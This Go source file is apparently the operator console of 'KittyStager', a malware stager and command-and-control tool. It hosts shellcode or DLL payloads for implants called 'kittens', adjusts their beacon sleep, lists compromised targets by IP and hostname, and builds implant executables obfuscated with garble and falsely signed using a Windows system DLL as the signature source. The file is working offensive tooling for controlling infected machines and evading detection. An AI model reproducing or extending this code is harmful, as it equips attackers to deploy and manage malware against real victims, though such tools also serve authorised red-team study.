package cli

import (
	"KittyStager/cmd/config"
	"KittyStager/cmd/generate"
	"KittyStager/cmd/http"
	"KittyStager/cmd/util"
	"fmt"
	i "github.com/JoaoDanielRufino/go-input-autocomplete"
	"github.com/briandowns/spinner"
	color "github.com/logrusorgru/aurora"
	"strconv"
	"strings"
	"time"
)

// payload chose the payload to use
func payload(kittenName string) {
	fmt.Printf("%s\n", color.Yellow("[*] Please enter the path to the payload"))
	var path string
	path, err := i.Read("Path: ")
	if err != nil {
		util.ErrPrint(err)
		return
	}
	if path == "" {
		fmt.Printf("%s\n", color.Red("[!] Please enter a path"))
		return
	}
	if strings.HasSuffix(path, ".dll") {
		fmt.Printf("%s\n", color.Yellow("[*] Please enter the entry point"))
		var function string
		function, err = i.Read("Entry: ")
		if err != nil {
			util.ErrPrint(err)
			return
		}
		err = http.HostDll(path, function, kittenName)
	} else {
		err = http.HostShellcode(path, kittenName)
	}
	if err != nil {
		util.ErrPrint(err)
		return
	}
}

// sleep change the sleep time of a target
func sleep(in []string, kittenName string) {
	if len(in) != 2 {
		util.ErrPrint(fmt.Errorf("invalid input"))
		return
	}
	time, err := strconv.Atoi(in[1])
	if err != nil {
		util.ErrPrint(err)
		return
	}
	err = http.HostSleep(time, kittenName)
	if err != nil {
		return
	}
}

// interact switch to interactive mode
func interact() {
	printTarget()
	if len(http.Targets) == 0 {
		fmt.Println(color.Red("No targets"))
		return
	}
	//diretly interact with a target
	if len(http.Targets) == 1 {
		for _, v := range http.Targets {
			err := Interact(v.GetName())
			if err != nil {
				return
			}
			return
		}
	}
	fmt.Printf("%s", color.Yellow("[*] Please enter the id of the kitten"))
	id, err := i.Read("id: ")
	if err != nil {
		util.ErrPrint(err)
		return
	}
	s, err := strconv.Atoi(id)
	if err != nil {
		util.ErrPrint(fmt.Errorf("invalid input"))
		return
	}
	kittenName, err := findId(s)
	if err != nil {
		util.ErrPrint(err)
		return
	}
	if _, ok := http.Targets[kittenName]; !ok {
		util.ErrPrint(fmt.Errorf("invalid id"))
		return
	}
	if !http.Targets[kittenName].GetAlive() {
		util.ErrPrint(fmt.Errorf("this kittens is dead"))
		return
	}
	fmt.Println()
	err = Interact(http.Targets[kittenName].GetName())
	if err != nil {
		util.ErrPrint(err)
		return
	}
}

// printTarget print the targets
func printTarget() {
	fmt.Printf("\n%s\n", color.Green("[*] Targets:"))
	fmt.Printf("%s\n", color.Green("Id:\tKitten name:\tIp:\t\tHostname:\t\tLast seen:\tSleep:\tAlive:"))
	fmt.Printf("%s\n", color.Green("═══\t════════════\t═══\t\t═════════\t\t══════════\t══════\t══════"))

	for name, x := range http.Targets {
		var e string
		if x.GetAlive() {
			e = "Yes"
			fmt.Printf("%d\t%s\t\t%s\t%s\t\t%s\t%d\t%s\n",
				x.GetId(),
				color.Yellow(name),
				color.Yellow(x.InitChecks.GetIp()),
				color.Yellow(x.InitChecks.GetHostname()),
				color.Yellow(x.GetLastSeen().Format("15:04:05")),
				color.Yellow(x.GetSleep()),
				color.Yellow(e))

		} else {
			e = "No 💀"
			fmt.Printf("%d\t%s\t\t%s\t%s\t\t%s\t%d\t%s\n",
				x.GetId(),
				color.Red(name),
				color.Red(x.InitChecks.GetIp()),
				color.Red(x.InitChecks.GetHostname()),
				color.Red(x.GetLastSeen().Format("15:04:05")),
				color.Red(x.GetSleep()),
				color.Red(e))

		}
	}
	fmt.Println()
}

// findId find the id of a target
func findId(id int) (string, error) {
	for _, x := range http.Targets {
		if x.GetId() == id {
			return x.GetName(), nil
		}
	}
	return "", fmt.Errorf("invalid id")
}

// printConfig print the config
func printConfig(conf config.General) {
	fmt.Printf("\n%s\t\t%s\n", color.Green("Host:"), color.Yellow(conf.GetHost()))
	fmt.Printf("%s\t\t%d\n", color.Green("Port:"), color.Yellow(conf.GetPort()))
	fmt.Printf("%s\t%s\n", color.Green("Endpoint:"), color.Yellow(conf.GetEndpoint()))
	fmt.Printf("%s\t%s\n", color.Green("UserAgent:"), color.Yellow(conf.GetUserAgent()))
	fmt.Printf("%s\t\t%d\n", color.Green("Sleep:"), color.Yellow(conf.GetSleep()))
	for _, v := range conf.GetMalPath() {
		fmt.Printf("%s\t%s\n", color.Green("Malware path:"), color.Yellow(v))
	}
	fmt.Println()
}

func genMalwareQuick() error {
	var compiler string
	outputPath := "./output/Kitten.exe"
	fmt.Println(color.Yellow(outputPath))
	fmt.Println("Generating a new kittens")
	kittenList, err := generate.NewKittenList()
	names := kittenList.GetKittenNames()
	if err != nil {
		return err
	}

	fmt.Printf("%s\n%s\n", color.Yellow("0 : go"), color.Yellow("1 : garble"))
	fmt.Printf("\n%s\n", color.Yellow("[!] Please chose the compiler"))
	id, err := i.Read("id: ")
	if err != nil {
		return err
	}
	s, err := strconv.Atoi(id)
	if s != 0 && s != 1 {
		return fmt.Errorf("invalid input")
	}
	if s == 0 {
		compiler = "go"
	} else {
		compiler = "garble"
	}
	fmt.Println()
	printKittens(names)
	//select a kitten
	fmt.Printf("\n%s\n", color.Yellow("[!] Please enter the id of the kitten to generate"))
	id, err = i.Read("id: ")
	if err != nil {
		return err
	}
	s, err = strconv.Atoi(id)
	if err != nil {
		return fmt.Errorf("invalid choice")
	}
	path, err := kittenList.GetKittensPath(names[s])
	if err != nil {
		return err
	}
	spin := spinner.New(spinner.CharSets[23], 100*time.Millisecond)
	spin.Start()

	err, out1 := generate.Description(outputPath)
	if err != nil {
		spin.Stop()
		return err
	}
	var out2 string
	if compiler == "go" {
		err, out2 = generate.GoBuild(outputPath, path)
		if err != nil {
			spin.Stop()
			return err
		}
	} else {
		err, out2 = generate.GarbleBuild(outputPath, path)
		if err != nil {
			spin.Stop()
			return err
		}
	}
	signedBinary := "C:\\Windows\\System32\\wscsvc.dll"

	err, out3 := generate.Signe(signedBinary, outputPath)
	if err != nil {
		spin.Stop()
		return err
	}
	spin.Stop()
	fmt.Println(color.Green(out1))
	fmt.Println(color.Green(out2))
	fmt.Println(color.Green(out3))
	return error(nil)
}

func printKittens(names []string) {
	fmt.Printf("%s\n", color.Green("Kitten names:"))
	for id, v := range names {
		fmt.Printf("%d : %s\n", color.Yellow(id), color.Yellow(v))
	}
}
